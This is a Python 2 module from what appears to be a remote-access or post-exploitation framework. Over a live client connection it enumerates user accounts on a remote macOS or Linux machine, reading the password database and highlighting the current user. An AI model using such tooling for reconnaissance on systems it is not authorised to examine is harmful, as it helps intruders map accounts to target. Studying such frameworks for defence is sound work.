import logging

from crispy.lib.module import *
from crispy.lib.fprint import *

logger = logging.getLogger(__name__)

__class_name__ = "UsersModule"
class UsersModule(CrispyModule):
    """ Enum users on a remote machine. """

    # can be: 'darwin', 'linux', 'windows', 'android'
    compatible_systems = ['Darwin', 'Linux']

    def run(self, args):
        logger.debug("users run() was called")
        
        if (self.is_compatible()):
            spacing = "{:15}{:25}{:<5}{:<5}{:15}{:8}"
            print spacing.format("\nUsername", " Full Name", " UID", " GID", " Home", " Shell")
            
            try:
                cuser = self.client.conn.modules['os'].getenv('USER')
                      
                if self.client.is_darwin():
                    users = self.client.conn.modules['os'].listdir('/Users')
                    for user in self.client.conn.modules['pwd'].getpwall():
                        #defautl mac osx gid is 20 or "staff" for non-system users
                        if user[2] == 0 or (user[2] > 500 and user[3] == 20):
                            if user[0] == cuser:
                                highlight(spacing.format(user[0], user[4], user[2], user[3], user[5], user[6]), "yellow")
                            else:
                                print spacing.format(user[0], user[4], user[2], user[3], user[5], user[6])
                elif self.client.is_unix():
                    for user in self.client.conn.modules['pwd'].getpwall():
                        #useradd man pages claims that users w/ gid 0-999 are typically reserved for system accounts
                        if user[2] == 0 or (user[2] > 999 and "nologin" not in user[6]):
                            if user[0] == cuser:
                                highlight(spacing.format(user[0], user[4], user[2], user[3], user[5], user[6]), "yellow")
                            else:
                                print spacing.format(user[0], user[4], user[2], user[3], user[5], user[6])
            except Exception as e:
                logger.error(e)
                error(e)
            
            success("Done.")
        else:
            error("Current OS's supported: {}".format(', '.join(self.compatible_systems)))
